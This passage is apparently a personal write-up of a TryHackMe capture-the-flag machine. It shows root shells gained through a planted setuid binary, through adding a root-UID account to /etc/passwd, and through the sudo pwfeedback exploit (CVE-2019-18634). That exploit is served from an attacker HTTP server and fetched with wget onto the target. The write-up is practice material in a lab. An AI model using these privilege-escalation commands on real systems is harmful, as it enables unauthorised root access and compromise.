+0 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sat Feb 18 17:17:45 2023 from ip-10-8-19-103.eu-west-1.compute.internal
+food@foodctf:~$ cd /tmp
+food@foodctf:/tmp$ ls
+-bash: ls: No such file or directory
+food@foodctf:/tmp$ ls -lah
+-bash: ls: No such file or directory
+food@foodctf:/tmp$ exit
+logout
+Connection to 10.10.241.181 closed.
+                                                                                                             
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh ramen@10.10.241.181                                      
+ramen@10.10.241.181's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Feb 18 17:29:15 UTC 2023
+
+  System load:  0.0               Processes:           100
+  Usage of /:   44.3% of 9.78GB   Users logged in:     0
+  Memory usage: 55%               IP address for eth0: 10.10.241.181
+  Swap usage:   0%
+
+0 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sat Feb 18 16:52:54 2023 from 10.8.19.103
+ramen@foodctf:~$ cd /tmp
+ramen@foodctf:/tmp$ ls -lah
+total 888K
+drwxrwxrwt 13 root  root  4.0K Feb 18 17:24 .
+drwxr-xr-x 24 root  root  4.0K Mar 19  2020 ..
+prw-r--r--  1 bread bread    0 Feb 18 16:47 f
+drwxrwxrwt  2 root  root  4.0K Feb 18 16:07 .font-unix
+drwxrwxrwt  2 root  root  4.0K Feb 18 16:07 .ICE-unix
+-rwxrwxr-x  1 food  food  7.9K Feb 18 17:24 libhax.so
+-rwxr-xr-x  1 bread bread 809K Feb 10 20:38 linpeas.sh
+-rwsr-xr-x  1 root  root  8.3K Feb 18 17:24 rootshell
+-rwxrwxr-x  1 food  food  1.2K Feb 18 17:23 screenroot.sh
+drwxr-xr-x  3 root  food  4.0K Feb 18 17:24 screens
+drwx------  3 root  root  4.0K Feb 18 16:07 systemd-private-614cc45266e24c36ab7892a0d49ca090-systemd-resolved.service-ddJDoI
+drwx------  3 root  root  4.0K Feb 18 16:07 systemd-private-614cc45266e24c36ab7892a0d49ca090-systemd-timesyncd.service-pYPg9t
+drwxrwxrwt  2 root  root  4.0K Feb 18 16:07 .Test-unix
+drwx------  2 pasta pasta 4.0K Feb 18 17:03 tmux-1002
+drwx------  2 ramen ramen 4.0K Feb 18 16:48 tmux-1003
+drwx------  2 bread bread 4.0K Feb 18 16:35 tmux-1004
+drwxrwxrwt  2 root  root  4.0K Feb 18 16:07 .X11-unix
+drwxrwxrwt  2 root  root  4.0K Feb 18 16:07 .XIM-unix
+ramen@foodctf:/tmp$ ./rootshell
+```
+```text
+# whoami
+root
+
+I see food user doesn't have much permission
+```
+```text
+# cat /home/tryhackme/flag7
+thm{5a926ab5d3561e976f4ae5a7e2d034fe}
+```
+```text
+# cat /home/bread/flag                            
+thm{7baf5aa8491a4b7b1c2d231a24aec575}
+```
+```text
+# cd /root
+```
+```text
+# ls   
+flag  king.txt	koth
+```
+```text
+# cat flag
+thm{9f1ee18d3021d135b03b943cc58f34db}
+```
+```text
+# echo 'WittyAle' >> king.txt
+```
+```text
+# cat king.txt
+kingWittyAle
+
+6 flags
+```
+```text
+# python3 -c 'import pty;pty.spawn("/bin/bash")'
+root@foodctf:/root# find / -type f -name flag8 2>/dev/null
+
+root@foodctf:/root# grep -Ri thm{
+.profile:# thm{237741b0835c77a30a4a7ef3393f8a7d}
+.mysql_history:INSERT\040INTO\040User\040VALUES\040('flag',\040'thm{2f30841ff8d9646845295135adda8332}');
+
+7 flags cz mysql is the same like before
+
+root@foodctf:/root# grep -Ri thm{
+.profile:# thm{237741b0835c77a30a4a7ef3393f8a7d}
+.mysql_history:INSERT\040INTO\040User\040VALUES\040('flag',\040'thm{2f30841ff8d9646845295135adda8332}');
+flag:thm{9f1ee18d3021d135b03b943cc58f34db}
+root@foodctf:/root# ls -lah
+total 7.1M
+drwx------  4 root root 4.0K Mar 30  2020 .
+drwxr-xr-x 24 root root 4.0K Mar 19  2020 ..
+-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
+-rw-r--r--  1 root root   38 Mar 28  2020 flag
+-rw-r--r--  1 root root   13 Feb 18 17:31 king.txt
+-rwxr-xr-x  1 root root 7.1M Mar 19  2020 koth
+drwxr-xr-x  3 root root 4.0K Mar 19  2020 .local
+-rw-------  1 root root  850 Mar 28  2020 .mysql_history
+-rw-r--r--  1 root root  206 Mar 28  2020 .profile
+drwx------  2 root root 4.0K Mar 19  2020 .ssh
+-rw-r--r--  1 root root  173 Mar 20  2020 .wget-hsts
+root@foodctf:/root# cd /home
+root@foodctf:/home# grep -Ri thm{
+tryhackme/flag7:thm{5a926ab5d3561e976f4ae5a7e2d034fe}
+grep: pasta/.gnupg/S.gpg-agent.extra: No such device or address
+grep: pasta/.gnupg/S.gpg-agent.browser: No such device or address
+grep: pasta/.gnupg/S.gpg-agent: No such device or address
+grep: pasta/.gnupg/S.gpg-agent.ssh: No such device or address
+grep: bread/.gnupg/S.gpg-agent.extra: No such device or address
+grep: bread/.gnupg/S.gpg-agent.browser: No such device or address
+grep: bread/.gnupg/S.gpg-agent: No such device or address
+grep: bread/.gnupg/S.gpg-agent.ssh: No such device or address
+bread/flag:thm{7baf5aa8491a4b7b1c2d231a24aec575}
+food/.flag:thm{58a3cb46855af54d0660b34fd20a04c1}
+root@foodctf:/home# cd /var
+root@foodctf:/var# grep -Ri thm{
+flag.txt:thm{0c48608136e6f8c86aecdb5d4c3d7ba8}
+log/auth.log:thm{4675c55160bb806ef39172976bc0aa5f}
+
+log/auth.log:thm{4675c55160bb806ef39172976bc0aa5f}
+
+last flag 
+
+8 :)
+
+another way
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ mkpasswd -m sha-512 Password1234
+$6$4N51xm8z..uzai6B$.VS3n7wI//OXXVv0lpYSyUFraoon/RSXD757ZBJgmddcUtAodLPPIokq8dcdpNmFroR78P6pKW7ZMzZT7vpRq1
+
+vim /etc/passwd
+
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+tryhackme:x:1000:1000:thm:/home/tryhackme:/bin/bash
+telnetd:x:111:113::/nonexistent:/usr/sbin/nologin
+food:x:1001:1001:,,,:/home/food:/bin/bash
+mysql:x:112:114:MySQL Server,,,:/nonexistent:/bin/false
+pasta:x:1002:1002:,,,:/home/pasta:/bin/bash
+ramen:x:1003:1003:,,,:/home/ramen:/bin/bash
+bread:x:1004:1004:,,,:/home/bread:/bin/bash
+
+-- INSERT -- 
+
+copy it
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ witty:$6$4N51xm8z..uzai6B$.VS3n7wI//OXXVv0lpYSyUFraoon/RSXD757ZBJgmddcUtAodLPPIokq8dcdpNmFroR78P6pKW7ZMzZT7vpRq1:0:0:witty:/root:/bin/bash
+
+Rq1:0:0:witty:/root:/bin/bash
+:wqa!
+
+ramen@foodctf:/tmp$ tail /etc/passwd
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+tryhackme:x:1000:1000:thm:/home/tryhackme:/bin/bash
+telnetd:x:111:113::/nonexistent:/usr/sbin/nologin
+food:x:1001:1001:,,,:/home/food:/bin/bash
+mysql:x:112:114:MySQL Server,,,:/nonexistent:/bin/false
+pasta:x:1002:1002:,,,:/home/pasta:/bin/bash
+ramen:x:1003:1003:,,,:/home/ramen:/bin/bash
+bread:x:1004:1004:,,,:/home/bread:/bin/bash
+witty:$6$4N51xm8z..uzai6B$.VS3n7wI//OXXVv0lpYSyUFraoon/RSXD757ZBJgmddcUtAodLPPIokq8dcdpNmFroR78P6pKW7ZMzZT7vpRq1:0:0:witty:/root:/bin/bash
+
+ramen@foodctf:/tmp$ su witty
+Password: Password1234
+root@foodctf:/tmp# :)
+
+another way
+
+One more privesc. We noticed earlier that we got asterisks when entering our password for Sudo. There was a recent CVE (2019-18634) that affects sudo when this option is configured. The option is called PWFEEDBACK
+
+https://www.exploit-db.com/exploits/47995
+
+ramen@foodctf:/tmp$ perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
+[sudo] password for ramen: Segmentation fault (core dumped)
+
+https://github.com/saleemrashid/sudo-cve-2019-18634
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
+Cloning into 'sudo-cve-2019-18634'...
+remote: Enumerating objects: 30, done.
+remote: Counting objects: 100% (30/30), done.
+remote: Compressing objects: 100% (21/21), done.
+remote: Total 30 (delta 14), reused 22 (delta 8), pack-reused 0
+Receiving objects: 100% (30/30), 5.95 KiB | 870.00 KiB/s, done.
+Resolving deltas: 100% (14/14), done.
+                                                        
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cd sudo-cve-2019-18634   
+                                                        
+┌──(witty㉿kali)-[~/Downloads/sudo-cve-2019-18634]
+└─$ ls
+exploit.c  LICENSE  Makefile  README.md
+
+┌──(witty㉿kali)-[~/Downloads/sudo-cve-2019-18634]
+└─$ make                            
+cc -Os -g3 -std=c11 -Wall -Wextra -Wpedantic -static -o exploit exploit.c
+                                                        
+┌──(witty㉿kali)-[~/Downloads/sudo-cve-2019-18634]
+└─$ ls
+exploit  exploit.c  LICENSE  Makefile  README.md
+
+┌──(witty㉿kali)-[~/Downloads/sudo-cve-2019-18634]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.241.181 - - [18/Feb/2023 13:06:10] "GET /exploit HTTP/1.1" 200 -
+
+ramen@foodctf:/tmp$ wget http://10.8.19.103:8000/exploit
+--  http://10.8.19.103:8000/exploit
+Connecting to 10.8.19.103:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 841784 (822K) [application/octet-stream]
+Saving to: ‘exploit’
+
+exploit                     100%[========================================>] 822.05K   253KB/s    in 3.2s    
+
+(253 KB/s) - ‘exploit’ saved [841784/841784]
+
+ramen@foodctf:/tmp$ chmod +x exploit
+ramen@foodctf:/tmp$ ./exploit
+[sudo] password for ramen: 
+Sorry, try again.
+```
+```text
+# whoami
+root
+
+:)
+
+3 ways , 8 flags
+```
+![[Pasted image 20230218111735.png]]
+![[Pasted image 20230218115725.png]]
+Get all 8 flags.
+Completed
+
+## Notes / Lessons Learned
+[[Android Malware Analysis]]
+
